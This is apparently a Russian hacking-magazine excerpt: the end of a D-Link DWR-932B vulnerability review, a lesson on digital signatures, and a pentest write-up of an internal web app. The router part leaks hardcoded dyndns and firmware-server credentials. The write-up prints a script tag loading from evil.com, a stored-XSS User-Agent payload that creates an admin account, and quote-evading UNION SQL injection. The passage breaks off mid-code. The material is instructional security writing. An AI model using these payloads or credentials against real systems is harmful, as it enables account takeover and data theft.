.text:0001B684        LDR       R0, [SP,#0x40+s] ; s
.text:0001B688        ADD       R1, PC, R1 ; "%08lu"
.text:0001B68C        MOV       R2, R4
.text:0001B690        ADD       SP, SP, #0x1C
.text:0001B694        LDMFD     SP!, {R4-R11,LR}
.text:0001B698        B         sprintf
.text:0001B698 ; Конец функции generate_wlan_wps_enrollee_pin




                           Продолжение статьи
ВЗЛОМ
ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ

    Начало статьи





УТЕЧКА АККАУНТА NO-IP
Файл /etc/inadyn-mt.conf (для клиентов dyndns) содержит имя пользователя
и «зашитый» пароль:

--log_file /usr/inadyn_srv.log
--forced_update_period 6000
--username alex_hung
--password 641021
--dyndns_system default@no-ip.com
--alias test.no-ip.com

МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ В ДЕМОНЕ HTTP (QMIWEB)
Файл /bin/qmiweb содержит много уязвимостей, но они схожи с найденны-
ми в LTE-роутере Quanta, на котором базируется исследуемое устройство. Так
что портировать старый код не составит труда.

УДАЛЕННАЯ ЗАГРУЗКА ПРОШИВКИ (FIRMWARE OVER THE AIR, FOTA)
Данные для доступа к серверу FOTA захардкожены в исполняемом файле /sbin/
fotad.





                                             Доступ к серверу FOTA из /sbin/fotad

Эти данные находятся в функции sub_CAAC, представлены как строки в Base64
и используются для получения прошивки.
  Демон FOTA пытается получить прошивку по HTTPS, но на момент написа-
ния статьи SSL-сертификат для https://qdp:qdp@fotatest.qmitw.com/qdh/
ispname/2031/appliance.xml был недействителен уже полтора года.





                                                        Функция sub_CAAC

Получаем следующие комбинации имени пользователя и пароля: qdpc:qdpc,
qdpe:qdpe, qdp:qdp.

ПЛОХОЕ РЕШЕНИЕ ПО ОБЕСПЕЧЕНИЮ БЕЗОПАСНОСТИ
В /etc/init.d/start_appmgr ты можешь увидеть странные shell-команды, вы-
полняющиеся от рута:

if [  -f /sbin/netcfg ]; then
  echo -n "chmod 777 netcfg"
  chmod 777 /sbin/netcfg
fi
if [  -f /bin/QNetCfg ]; then
  echo -n "chmod 777 QNetCfg"
  chmod 777 /bin/QNetCfg
fi

Сложно сказать, зачем производителю нужны файлы с правами 777 в директо-
риях /bin/ и /sbin/.

УДАЛЕНА БЕЗОПАСНОСТЬ В UPNP
UPnP позволяет динамически добавлять правила для файрвола. Из-за угроз
безопасности в некоторых опасных местах создавались новые правила для не-
доверенных LAN-клиентов.
   Ненадежность UPnP была модной десять лет назад (в 2006 году). Уровень
безопасности UPnP-программ (miniupnp) в этом роутере снижен, что позволя-
ет атакующему, находящемуся в той же локальной сети, добавить перенаправ-
ление порта из интернета на других клиентов, находящихся в этой же сети.
   /var/miniupnpd.conf генерируется с помощью программы /bin/appmgr.





                                       Код генерации файла /var/miniupnpd.conf

В данном случае получится следующий файл /var/miniupnpd.conf:

ext_ifname=rmnet0
listening_ip=bridge0
port=2869
enable_natpmp=yes
enable_upnp=yes
bitrate_up=14000000
bitrate_down=14000000
secure_mode=no # «Защищенный» режим: когда включен, клиент UPnP
                 позволяет добавлять правила только для своих IP
presentation_url=http://192.168.1.1
system_uptime=yes
notify_interval=30
upnp_forward_chain=MINIUPNPD
upnp_nat_chain=MINIUPNPD

В конфигурационном файле нет ограничений для правил доступа UPnP, вопреки
распространенной практике. При использовании UPnP рекомендуется разре-
шить переадресацию для портов выше 1024. Нормальный файл с настройками:

# UPnP permission rules
# (allow|deny) (external port range) ip/mask (internal port range)
# A port range is <min port>-<max port> or <port> if there is only
# one port in the range.
# ip/mask format must be nn.nn.nn.nn/nn
# it is advised to only allow redirection of port above 1024
# and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
allow 1024-65535 192.168.0.0/24 1024-65535
deny 0-65535 0.0.0.0/0 0-65535

В настройках уязвимого роутера, где нет никаких правил доступа, атакующий
может перенаправить все из WAN в LAN. К примеру, злоумышленник может до-
бавить правило переадресации, чтобы разрешить трафик из интернета на ло-
кальные серверы Exchange, базы данных, почтовые, FTP- и HTTP-серверы и так
далее. На самом деле отсутствие мер безопасности позволяет локальному
пользователю пересылать все, что он хочет, из интернета в LAN.
  Вопросы автору исследования ты можешь задать через контакты в его пер-
сональном блоге. Оригинальный advisory (txt) представлен там же. Если ис-
пользуешь D-Link DWR-932B, советую уделить внимание исправлению уязви-
мостей.

TARGETS
D-Link DWR-932B. Уязвимости протестированы на последней  доступной
прошивке на момент исследования (firmware  DWR-932_fw_revB_2_02_eu_
en_20150709.zip, model revision B, /Share3/DailyBuild/QDX_DailyBuild/
QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/
tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-
gnueabi/arm-oe-linux-gnueabi-gcc).

SOLUTION
На момент написания оригинальной статьи об исправлении не было известно.
В поддержке D-Link исследователю ответили, что клиенты должны сами связать-
ся с локальными или региональными представителями D-Link. Но на момент на-
писания нашего обзора новая версия прошивки (DWR-932_fw_revB_2_03_eu_
en_20161011.zip) появилась на официальном сайте.
ВЗЛОМ
ПОГРУЖЕНИЕ
В КРИПТУ
 ЧАСТЬ 5: ЭЛЕКТРОННАЯ ПОДПИСЬ





Электронная цифровая подпись сейчас
на слуху — многие современные компании
потихоньку переходят на электронный до-
                                                                                Анастасия Береснева
                                                                                              anastasiya3161@gmail.comкументооборот. Да и в повседневной жиз-
ни ты наверняка сталкивался с этой штукой.
Если в двух словах, суть ЭЦП очень проста: есть удосто-
веряющий центр, есть генератор ключей, еще немного
магии, и вуаля — все документы подписаны. Осталось ра-
зобраться, что же за магия позволяет цифровой подписи
работать.

Roadmap

Это пятый урок из цикла «Погружение в крипту». Все уроки цикла в хронологи-
ческом порядке:
•  Урок 1. Исторические шифры: основы, исторические шифраторы, как рабо-
   тают (и анализируются) шифры сдвига, замены, Рихарда Зорге, шифр Вер-
   нама и шифровальные машины
•  Урок 2. Распределение ключей: что это такое, как выполняется распреде-
   ление ключей и как выбрать криптостойкий ключ
•  Урок 3. Современные отечественные шифры: что такое сеть Фейстеля, ка-
   кими бывают отечественные блочные шифры, используемые в современных
   протоколах, — ГОСТ 28147—89, «Кузнечик»
•  Урок 4. Современные зарубежные шифры: что такое, как работают и в чем
   разница между 3DES, AES, Blowfish, IDEA, Threefish от Брюса Шнайера
•  Урок 5. Электронная подпись: виды ЭП, как они работают и как их исполь-
   зовать (ты здесь)
•  Урок 6. Квантовая криптография: что это такое, где используется и как по-
   могает в распределении секретных ключей, генерации случайных чисел
   и электронной подписи



КАК РАБОТАЕТ ЦИФРОВАЯ ПОДПИСЬ
Если вспомнить формальное определение, то ЭЦП — это реквизит электрон-
ного документа. Другими словами, последовательность битов, вычисленная
уникально для каждого конкретного сообщения. Подпись может быть вычисле-
на как с применением секретного ключа, так и без него. Без секретного ключа
подпись представляет собой просто код, который может доказать, что доку-
мент не был изменен. С использованием секретного ключа подпись докажет
целостность сообщения, позволит убедиться в его подлинности и аутентифи-
цировать источник.
   Если ты читал вторую часть нашего цикла, то помнишь, что существуют сим-
метричный и асимметричный подходы к шифрованию. С электронной подпи-
сью дела обстоят очень похоже — есть подписи с симметричным механизмом,
а есть с асимметричным.
   Симметричный механизм подписи малоприменим на практике — никому
не хочется генерировать ключи для каждой подписи заново. А как ты помнишь,
именно в одинаковых ключах кроется фишка симметричной криптографии.
• В лучших традициях асимметричной криптографии — имеем пару открытый
   и секретный ключ. Но не спеши пролистывать все это описание. Электрон-
   ная подпись концептуально отличается от шифрования применением клю-
   чей, описанного ранее.
•  От документа или сообщения подсчитывается хеш-функция, которая сокра-
   тит сообщение любого объема до определенного количества байтов.
•  Посредством криптографических преобразований вычисляется сама элек-
   тронная подпись. В отличие от асимметричного шифрования, подпись ос-
   нована на закрытом ключе, а вот проверить с помощью открытого ключа ее
   может любой его обладатель. Если помнишь, в шифровании все происхо-
   дит наоборот: шифруют для нас на открытом ключе, а вот расшифровывать
  мы будем с помощью секретного ключа.
•  Электронная подпись предоставляется вместе с исходным документом
   на проверку. По полученной композиции можно доказать, что документ с мо-
   мента вычисления подписи не был изменен.





Схемы электронной подписи так же многообразны, как и способы шифро-
вания. Чтобы схема подписи была стойкой, нужно, чтобы она основывалась
на трудновычислимой математической задаче. Есть два типа таких задач: фак-
торизация больших чисел и дискретное логарифмирование.

ФАКТОРИЗАЦИЯ БОЛЬШИХ ЧИСЕЛ
Рассмотрим на практике электронную подпись на основе знаменитого алго-
ритма RSA. Шифрование RSA мы рассматривать не стали — это мейнстрим,
и в той же «Википедии» есть его подробное описание.

1. Генерация ключей
Причина стойкости RSA кроется в сложности факторизации больших чисел.
Другими словами, перебором очень трудно подобрать такие простые чис-
ла, которые в произведении дают модуль n. Ключи генерируются одинаково
для подписи и для шифрования.





Когда ключи сгенерированы, можно приступить к вычислению электронной
подписи.

2. Вычисление электронной подписи





3. Проверка электронной подписи





RSA, как известно, собирается уходить на пенсию, потому что вычислительные
мощности растут не по дням, а по часам. Недалек тот день, когда 1024-битный
ключ RSA можно будет подобрать за считаные минуты? Впрочем, о квантовых
компьютерах мы поговорим в следующий раз.
  В общем, не стоит полагаться на стойкость этой схемы подписи RSA, осо-
бенно с такими «криптостойкими» ключами, как в нашем примере.

ДИСКРЕТНОЕ ЛОГАРИФМИРОВАНИЕ
Это вторая сложная проблема, на которой основаны цифровые подписи.
Для начала хорошо бы усвоить, что такое дискретный логарифм. Для кого-то
такое словосочетание может звучать пугающе, но на самом деле это одна
из самых простых для понимания вещей в этой статье.
   Предположим, дано уравнение 4x  =  13  (mod  15). Задача нахождения
x и есть задача дискретного логарифмирования. Почему же она так сложна
для вычисления? Попробуй решить это уравнение перебором! Компьютер, яс-
ное дело, будет более успешен, но и задачи дискретного логарифмирования
обычно далеко не так просты. Возьмем для примера схему Эль-Гамаля.

1. Генерация подписи





2. Проверка подписи





Даже если не вникать в схему, понятно, что такой алгоритм сложнее. Кроме
того, нигде уже не используется простой модуль, его сменили эллиптиче-
ские кривые. Эллиптическая кривая — это кривая, которая задана кубическим
уравнением и имеет невообразимо сложное представление. Задача решения
логарифма в группе точек, которые принадлежат эллиптической кривой, вы-
числительно сложная, и на данный момент не существует таких мощностей,
которые решали бы это уравнение за полиномиальное время, если длина се-
кретного ключа составляет 512 бит. Согласно задаче дискретного логарифми-
рования, невероятно сложно найти на кривой две такие точки, которые связы-
вает операция возведения в некоторую степень.

ЭЦП НА ПРАКТИКЕ
В России, как и во многих развитых странах, электронная подпись имеет офи-
циальный юридический статус. У нас этот факт регламентирует закон № 63-
ФЗ «Об электронной подписи». Однако он утверждает, что юридической силой
обладает далеко не любая электронная подпись, а только соответствующая
определенным критериям:
•  подпись сгенерирована посредством криптографического преобразова-
   ния с секретным ключом;
•  этот ключ и соответствующий ему открытый ключ выданы квалифицирован-
  ным удостоверяющим центром;
•  по подписи можно достоверно установить ее обладателя.

Подпись также должна быть вычислена средствами, соответствующими тре-
бованиям закона. Этим требованиям удовлетворяет отечественный алгоритм
шифрования ГОСТ 34.10—2012. Он использует математический аппарат эл-
липтических кривых, является достаточно стойким и официально используется
для разработки криптографических средств, реализующих электронную под-
пись. Для того чтобы попробовать неквалифицированную подпись — без сер-
тификата удостоверяющего центра, можно воспользоваться известной PGP.
Потестировать подпись можно, к примеру, на сайте ReadVerify.
   Стоит сказать, что в нашей стране электронная подпись используется
чаще, чем можно себе представить. В банках, налоговых, торгово-закупочных
операциях, бухгалтерии — во всех этих организациях используется или вне-
дряется ЭЦП. Электронная подпись отважно борется со злом бюрократии, од-
нако до полной победы еще далеко.
  За рубежом электронный документооборот процветает еще дольше.
Официальный стандарт электронной подписи в США DSS (Digital Signature
Standard) также использует эллиптические кривые и основан на описанной
выше схеме Эль-Гамаля.

ЦИФРОВАЯ ПОДПИСЬ В BITCOIN
Помимо прочего, электронная подпись используется в криптовалютах, в частно-
сти — в Bitcoin. У каждого пользователя Bitcoin есть пара из секретного и откры-
того ключа. Хеш-значение открытого ключа служит основным адресом для пе-
редачи монет. Это значение не секретно, и сообщать его можно кому угодно.
Но по значению хеша вычислить значение открытого ключа невозможно.
  Сама пара ключей будет использована лишь однажды — при передаче прав
собственности. На этом жизнь пары ключей заканчивается.
• PUB1 — публичный ключ;
•  PRIV1 — секретный ключ;
• HASH1 или HASH(PUB1) — хеш-значение открытого ключа (биткойн-адрес);
• HASH2 или HASH(PUB2) — хеш открытого ключа следующего владельца.

Вот как устроен сам процесс передачи прав собственности на биткойны.
1. Владелец монеты  открыто сообщает хеш  своего  публичного ключа
   HASH(PUB1), это и будет идентифицировать биткойн.
2. До момента продажи оба ключа PUB1, PRIV1 продавца остаются в секрете.
   Известен только HASH(PUB1) и соответствующий ему биткойн.
3. Как только появляется покупатель, владелец формирует открытое пись-
   мо, в котором указывает адрес биткойна HASH(PUB1) и хеш-значение пу-
   бличного ключа нового владельца HASH(PUB2). И конечно же, подписывает
   письмо своим секретным ключом PRIV1, прилагая публичный ключ PUB1.
4. После этого пара ключей владельца PUB1 и PRIV1 теряют свою актуальность.
   Публичным ключом можно проверить само письмо, узнать новый адрес монеты.





О втором собственнике ничего не известно, кроме HASH(PUB2), до тех пор
пока он не передаст права третьему владельцу. И эта цепочка может быть бес-
конечной.
   Подписывая передачу прав с использованием ЭЦП, собственник под-
тверждает не только свою личность, но и свое согласие на проведение сдел-
ки. То есть вернуть монетку он уже не может и с этим согласился, подписав-
шись электронной подписью.
   Благодаря HASH(PUB) получается двойная защита. Первая загадка — уз-
нать публичный ключ по его хешу. Вторая загадка — подписаться чужим се-
кретным ключом.
   Такая технология построения цепи передачи прав и называется блокчей-
ном. Благодаря этой технологии можно отследить историю владения до самых
истоков, но изменить эту историю никак нельзя.

ВЫВОДЫ
Будущее неразрывно связано с криптографией. В один прекрасный момент
при получении паспорта наши дети будут генерировать электронную подпись
и покупать чипсы в ларьке за криптовалюту. Что готовит нам будущее с точки
зрения развития криптографии, посмотрим в следующей статье на примере
квантовых компьютеров.
ВЗЛОМ

БЭКАП =
БЭКДОР
 ИЛИ ИСТОРИЯ ОДНОГО ПЕНТЕСТА





Я работаю в большой организации, и,
как положено большой организации, у нас
есть внутренние веб-приложения, кото-
рые реализуют довольно ответственную            vovanov575@gmail.comВладимир Петров
бизнес-логику. Именно о таком приложе-
нии мы сегодня и поговорим, проведем его анализ защи-
щенности, найдем парочку уязвимостей и навсегда уяс-
ним, как не стоит хранить бэкапы. Сразу скажу, данное
веб-приложение не имеет доступа в интернет и все най-
денные уязвимости уже устранены.

РАЗВЕДКА
Итак, приступим. Рабочая директория этого веб-приложения — /sflat/, и туда
нас посылает заголовок Location в ответе сервера со статус-кодом 302 в слу-
чае обращения к корневой директории (рис. 1).





                                                              Рис. 1. Обращение
                                                           к корневой директории

При обращении к этой директории происходит еще одно перенаправление
на HTTPS-версию, которая использует самоподписанный сертификат (рис. 2).





                                   Рис. 2. Перенаправление на HTTPS-версию сервиса

Как видишь, сервер отвечает статус-кодом 302 и в ответе присутствует за-
головок Set-Cookie, что небезопасно: при таком алгоритме выдачи иденти-
фикатора сессии его можно перехватить во время получения идентификато-
ра по протоколу HTTP. Для этого достаточно просто реализовать MITM-атаку
(встав посередине между клиентом и сервером) и прослушать трафик.
  Но спешу тебя заверить: такой фокус не проходит, потому что, когда
на HTTPS-версию сервиса обращаются с идентификатором, выданным ранее
по HTTP, сервер не принимает данный идентификатор и еще раз выставляет
заголовок Set-Cookie с новым идентификатором и такими же флагами.
  И что такого в HTTPS-версии сервиса, как нам это помешает? А помешает
нам это тем, что провести XSS-атаку с подгружаемым с HTTP-домена внешним
скриптом не получится:

<script src="http://evil.com/evil.js"></script>

Если мы подгрузим такой скрипт с HTTP-домена, то более-менее современ-
ный браузер клиента ругнется на mixed content, не загрузит и не выполнит его
(рис. 3).





                     Рис. 3. Блокировка HTTP-контента на сайтах, использующих HTTPS

Тогда у нас не остается выбора, кроме как подгружать внешний скрипт
с HTTPS-домена, но самоподписанный сертификат тут не пройдет, и нам при-
дется покупать сертификат.
  Идем дальше. При обращении к директории /sflat/ запрос обрабатыва-
ет скрипт /sflat/index.php, который просит нас ввести свои учетные данные
(они у нас есть, для теста на проникновение была предоставлена учетная за-
пись с административными правами, тестируем методом серого ящика). Так
выглядит страница аутентификации (рис. 4).





                                                    Рис. 4. Страница аутентификации

Первым делом начнем с того, что узнаем как можно больше об исследуемой си-
стеме, посмотрим на эту же страницу аутентификации в raw-формате (рис. 5).





                                                Рис. 5. Код страницы аутентификации

Какие выводы мы можем сделать на данном этапе:
1. Сервер не выдает информацию о себе. Мы видим, что это Apache, но не зна-
   ем, какой версии и в какой ОС он работает (заголовок Server можно изме-
   нить, так что полностью доверять ему не стоит).
2. Значение заголовка Set-Cookie говорит нам о том, что PHPSESSID (сесси-
   онный идентификатор пользователя) должен передаваться только по про-
   токолу HTTPS (флаг secure) и перехватить его, прослушивая трафик, не по-
   лучится, как и получить его значение с помощью XSS (флаг HttpOnly), если,
   конечно, на сервере запрещен метод Trace. Ведь если метод Trace досту-
   пен, тогда возможно провести атаку XST и считать Cookie, даже если они
  защищены флагом HttpOnly.
3. Заголовок CSP (Content Security Policy) не используется, а данная техноло-
   гия позволяет четко задать список ресурсов, с которых возможно загружать
   скрипты, стили, фреймы и прочее. Кстати, во второй версии CSP можно даже
   указать хеш-сумму скрипта, который может быть исполнен. Значит, все-таки
   стоит подумать об XSS.
4. Объявлен тип строгого синтаксиса XHTML, поэтому забываем об атаке RPO
    (Relative Path Overwrite).

   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" … >

5. Данное приложение использует библиотеку jQuery, а это значит, что XSS
   для нас сильно упрощается, так как мы можем использовать короткие и ем-
   кие методы jQuery (write less, do more — так вроде звучит их слоган), в случае
   если у нас будет ограниченный размер полезной нагрузки.

АТАКА НА КЛИЕНТОВ ВЕБ-ПРИЛОЖЕНИЯ
Обычно тест на проникновение в таких закрытых системах я начинаю с прове-
дения атак на клиентов, так как их защитой обычно пренебрегают. Но, как вид-
но из первичного анализа, не стоит ожидать особо больших результатов
при проведении атак на клиентов этого веб-приложения.

XSS
При упоминании атак на клиентов первое, что приходит в голову, — это XSS-а-
таки, которые существуют благодаря недостаточному или полному отсутствию
фильтрации вывода данных на страницу.
   Как правило, одна из основных целей XSS атак — это угон сессий. Узна-
ем, сможем ли мы украсть PHPSESSID. Исходя из того, что мы уже знаем, у нас
есть шанс украсть данный идентификатор, только если метод Trace доступен
на сервере.





                                                                      Рис. 6. Запрос
                                                              методом Trace

Как видно из рис. 6, сервер запрещает использование метода Trace, так
что мы забываем об атаке XST и пока что забываем об XSS.

CSRF
Следующее важное звено в атаках на клиентов — это CSRF. Ситуация та же:
все важные формы защищены с помощью CSRF-токена. Но данный токен вы-
дается один раз на всю сессию пользователя, и, что самое интересное, раз-
работчики с помощью JavaScript могут получить его значение — а если они
могут, то и мы сможем (рис. 7).





                     Рис. 7. Получение значения CSRF-токена в исходном коде страницы


ПРОВЕДЕНИЕ АТАКИ
Итак, что у нас есть на данный момент: мы можем получить значение CSRF-то-
кена, который не протухает в течение всей пользовательской сессии, с по-
мощью XSS, осталось только ее найти. Что же я только не делал, как только
не пробовал инъектировать client-side-код в выводимые пользователю страни-
цы, как много времени у меня ушло на поиск отраженных XSS, но ничего не вы-
ходило!
   Однако через некоторое время я натолкнулся на интересную вкладку под
названием «История изменений» (рис. 8).





                                                Рис. 8. Вкладка «История изменений»

В этой вкладке ведется история всех изменений в сервисе, но, кроме того,
в историю записываются факты аутентификации: кто, когда, с какого IP-адреса
и с каким User-Agent зашел (рис. 9).





                       Рис. 9. Сохранение в истории факта входа пользователя в систему

А существует ли фильтрация строки User-Agent? Проверим это с помощью до-
полнения Modify Headers. Изменим User-Agent браузера, в качестве наиболее
короткого примера выберем строку User-Agent для браузера Internet Explorer
в Windows XP: Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) — всего
46 байт, а в качестве проверки на наличие фильтров добавим к данной строке
следующее:

<script>console.log(document.cookie)</script>

Данный скрипт выведет в консоль браузера текущие Cookie пользователя. Мы
специально не пользуемся функциями alert и prompt, поскольку они могут
нас скомпрометировать, когда администратор сервиса будет просматривать
вкладку «История изменений». Получаем еще 45 байт, итого 91 байт полезной
нагрузки. Так выглядит получившийся User-Agent в Modify Headers (рис. 10).





                                            Рис. 10. Строка User-Agent в Modify Headers

А теперь проверим, фильтрует ли приложение строку User-Agent. Для этого за-
ново проходим аутентификацию в сервисе с уже измененным значением заго-
ловка User-Agent, открываем консоль браузера и переходим во вкладку «Исто-
рия изменений» (рис. 11).





                                      Рис. 11. Проверка фильтрации строки User-Agent

Как видим, в консоли браузера появилось значение CSRF-TOKEN=…, а это зна-
чит, что наша полезная нагрузка отработала, при этом строка в истории гово-
рит о том, что пользователь просто вошел в систему с использованием брау-
зера Internet Explorer в Windows XP.
   Итого на данный момент получаем следующее: хранимая XSS с условием,
что злоумышленник пройдет аутентификацию, а администратор просмотрит
историю изменений. Не так уж и плохо.
   Теперь придумаем коварную полезную нагрузку. Первое, что приходит в го-
лову, — создать нового администратора в приложении. Что для этого нужно:
1. Пользователь с административными правами в сервисе должен просмо-
   треть строку в истории изменений, в которой будет содержаться наша по-
   лезная нагрузка.
2. Нам необходимо узнать спецификацию запроса на добавление нового
   пользователя с административными правами.
3. Размер полезной нагрузки не должен превышать длины буфера, который
   используется для вывода строки User-Agent.

Длину буфера, который хранит строку с User-Agent, мы не знаем, а чтобы уз-
нать, нам придется отправить длинную строку в заголовке User-Agent на этапе
аутентификации в приложении, что нас сразу же выдаст, если администратор
просмотрит историю. Раз мы не можем узнать длину буфера, просто ориенти-
руемся на минимальный объем полезной нагрузки, который только получится.
   Административные права в приложении у нас есть, так как нам предостав-
лена админская учетная запись в целях тестирования, а спецификацию запро-
са сейчас узнаем. Для этого попробуем создать пользователя и перехватим
запрос к серверу с помощью Burp Suite (рис. 12).





                                   Рис. 12. Запрос на добавление нового пользователя

Теперь есть все необходимое для создания полезной нагрузки на JavaScript,
которая создаст нового администратора в сервисе:
1. В запросе на добавление пользователя присутствует значение CSRF-то-
   кена (второй параметр в теле POST-запроса), данное значение мы можем
   получить из document.cookie, удалив первые 11 байт: t=document.cookie.
   substr(11);.
2. Необходимо отправить POST-запрос, для этого к нам на помощь при-
   дет  jQuery  c  методом  POST:  $.post("/sflat/add.php","mode=add_
   user&csrf="+t+"…")

В общем, User-Agent будет выглядеть так:

    Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)<script>t=
    document.cookie.substr(11);$.post("/sflat/add.php","mode=
    add_user&csrf="+t+"…");</script>

Перехватываем в Burp Suite запрос на аутентификацию в сервисе и подменя-
ем User-Agent (рис. 13).





                                              Рис. 13. Подмена User-Agent в Burp Suite

Как видишь, данный запрос должен создать администратора сервиса с име-
нем А, логином АB (ограничение приложения: логин должен содержать от 2
до 20 символов) и паролем А.
   Проверим, работает ли наша полезная нагрузка. Для этого опять перейдем
во вкладку «История изменений» и откроем вкладку «Network» в консоли бра-
узера, чтобы убедиться, что браузер отправляет POST-запрос на добавление
пользователя (рис. 14).





                                Рис. 14. Отправка запроса на добавление пользователя

Запрос был успешно отправлен браузером (получен статус-код 200), а так
как наша учетная запись имеет административные права, то новый пользова-
тель был успешно создан. Попробуем аутентифицироваться с новыми учетны-
ми данными (рис. 15).





                                                            Рис. 15. Аутентификация
Аутентификация пройдена (рис. 16).





                                                   Рис. 16. Аутентификация пройдена

И у нашей новой учетной записи административные права, цель достигнута
(рис. 17).





                                               Рис. 17. Список пользователей сервиса

РЕЗУЛЬТАТ № 1
С атаками на пользователей закончим. Итого в сухом остатке следующий век-
тор: внутренний злоумышленник с минимальными правами в сервисе может
получить к нему административный доступ через хранимую XSS в строке User-
Agent при прохождении аутентификации в сервисе, данная XSS сработает тог-
да, когда администратор просмотрит историю изменений. Для оценки най-
денных уязвимостей мы используем систему оценки CVSS второй версии. Да,
да, ты говоришь: уже есть третья версия, почему вы используете устаревшую?
Но мы к ней привыкли :). Кстати, если тебе интересно, как оценить найденную
уязвимость, то можешь воспользоваться этим сайтом или этим.

Вектор CVSS v2: (AV:N/AC:H/Au:S/C:C/I:C/A:C), базовая оценка: 7.1.


АТАКА НА СЕРВЕР
А мы продолжим. Теперь займемся сервером и углубим нашу разведку. Спер-
ва узнаем установленную ОС. Для этого воспользуемся всем известным сред-
ством сетевого сканирования Nmap. Из результатов сканирования видим,
что веб-приложение работает на ОС Windows и, кроме 80-го и 443-го портов,
открыт еще и 5432-й (СУБД PostgreSQL).
   Говорить про поиск поддоменов и виртуал-хостов особого смысла нет, так
как системы подобного рода строятся по принципу один сервер = одно прило-
жение. Но никто нам не мешает поискать бэкапы, оставленные заботливыми
администраторами в доступной для нас директории (Google Hacking Database
(GHDB) нам не поможет, так как система не выходит в интернет). Для того что-
бы пройтись по приложению и сбрутить имена файлов и директорий, восполь-
зуемся утилитой DirBuster. Брут также интересных результатов не дал. Да... Не-
густо:
1. ОС: Windows.
2. Web server: Apache.
3. DBMS: PostgreSQL.
4. Backend: PHP.

SQLI
Идем дальше. Проверим наше веб-приложение на наличие SQLi. Потеряв
большое количество времени и использовав все возможные фокусы при инъ-
екциях в строковые параметры, я все-таки перешел к числовым — и не зря.





                                               Рис. 18. Запрос с числовым параметром

Протестируем параметр id в POST-запросе на выдачу информации об управ-
лении. Как видно из рис. 18, в базе данных содержится управление с именем
«Тестовые данные» и номером 417. Теперь попробуем запросить управление
с номером 418-1 (рис. 19).





                                                            Рис. 19. Проверка на SQLi

Выражение 418-1 выполнилось, и сервер вернул имя управления с номером
417, но при этом инъекции в строковый параметр не проходят, а это значит,
что, скорее всего, санитизация входящего параметра проводится, а вот типи-
зация и валидация — нет, поэтому SQLi есть.
   Для дальнейшей атаки с помощью UNION-запроса необходимо определить
количество и формат полей в запросе, в параметр которого происходит инъ-
екция. Для этого в параметр подставим неверный идентификатор управления,
например -1, и будем перебирать количество полей с использованием значе-
ния null, так как данное значение возможно выводить и со строковыми пара-
метрами, и с числовыми. Также для определения количества полей в запро-
се можно воспользоваться оператором GROUP BY, но это уже кому как больше
нравится.





                                    Рис. 20. Проверка количества параметров выборки

Как видно из рис. 20, в запросе осуществляется выборка по трем полям: пер-
вое — числовое, второе и третье — строковые.
  Во время тестирования удалось определить следующее:
1. На страницу сервер выводит результат выборки по первым двум полям.
2. Происходит санитизация кавычек и знака точка с запятой.

При санитизации для UNION-запросов с условием (WHERE), где необходимо
сделать сравнение со строкой, будем пользоваться функциями concat и CHR:
первая соединяет символы или подстроки в одну строку, вторая позволяет вы-
водить ASCII-символы по их номеру.
   Попробуем узнать с помощью SQLi побольше информации: версию СУБД,
текущего пользователя и базу данных (рис. 21).





                                                          Рис. 21. Вывод информации

А сейчас попытаемся узнать пароль или хеш пароля администратора веб-при-
ложения. Чтобы это сделать, необходимо выполнить такой запрос:

    -1 UNION SELECT 1,password,null FROM users WHERE login='admin'

  В условиях санитизации кавычек запрос будет выглядеть так:

    -1 UNION SELECT 1,password,null FROM users WHERE login=concat
        (CHR(97),CHR(100),CHR(109),CHR(105),CHR(110)).





                                           Рис. 22. Получение пароля администратора

Хеш пароля администратора мы получили (рис. 22), но при этом алгоритм
хеширования восстановить не удалось. Единственное, что можно предполо-
жить исходя из длины хеша, — это то, что алгоритм хеширования, возможно,
имеет вид

sha512(salt + md5(md5(password))).


РЕЗУЛЬТАТ № 2
У нас есть еще один вектор: внутренний злоумышленник, имеющий аутентифи-
кационные данные и минимальные права в приложении, может провести атаку
SQLi на базу данных веб-приложения и считать из нее все данные.

Вектор CVSS v2: (AV:N/AC:H/Au:S/C:C/I:N/A:N), базовая оценка: 4.9.

SQLi в числовой параметр в условиях санитизации одинарных кавычек и зна-
ка точка с запятой значит, что данные мы считать сможем, докуда дотянемся,
а вот INSERT- или UPDATE-запросы сделать не получится. Это, конечно, не ма-
нипулирование пользователями сервиса или shell, но хоть что-то.

Дальнейшие пути развития

В нашей статье при атаке на сервер используется только SQLi, но не стоит за-
бывать и о таких атаках, как RFI, LFI или XXE. И еще: если после сетевого скани-
рования ты точно знаешь версии сервисов, то обязательно посмотри, есть ли
на них публичные эксплоиты, — ведь это стоит на 9-м месте в OWASP top 10.





                           Продолжение статьи
ВЗЛОМ


     Начало статьи
БЭКАП = БЭКДОР
ИЛИ ИСТОРИЯ ОДНОГО ПЕНТЕСТА


БЭКАП
После того как я потратил еще какое-то количество времени на поиск
server-side-уязвимостей, мне вдруг пришла одна очень интересная мысль:
если рабочая директория сервиса называется sflat, то, может, ее бэкап тоже
называется sflat? Мысль оказалась верной. В корневой директории сервера
находился архив sflat.rar (рис. 23)!





                                                 Рис. 23. Архив с бэкапом приложения

В архиве содержался исходный код приложения, находящийся в рабочей ди-
ректории проекта (рис. 24).





                                                              Рис. 24. Листинг архива

При анализе исходников были найдены две учетные записи для доступа к СУБД
(рис. 25).





                                     Рис. 25. Учетные данные для подключения к СУБД

Пользователи rХХХХХХa, eХХХХХХa и пароли к ним в открытом виде. Удаленное
подключение к базе данных результатов не дало (рис. 26).




                                                 Рис. 26. Прямое подключение к СУБД

Судя по ответу СУБД, можно сделать вывод о том, что удаленное подключение
возможно только с доверенных IP-адресов.

ПОДГОТОВКА К АТАКЕ
При дальнейшем анализе исходных кодов была обнаружена директория /
sflat/slov/ со служебными скриптами (рис. 27).





                                               Рис. 27. Листинг служебной директории

В этой служебной директории находился один очень интересный скрипт —
stepenrod.php:

    <?php
    header('Content-Type: text/html; charset=utf-8');
    if ($_SERVER'HTTP_X_REQUESTED_WITH' ( == 'XMLHttpRequest') {
        if ($_GET['q']) {
            include('./../include/connect.php');
            include('./../include/func.php');
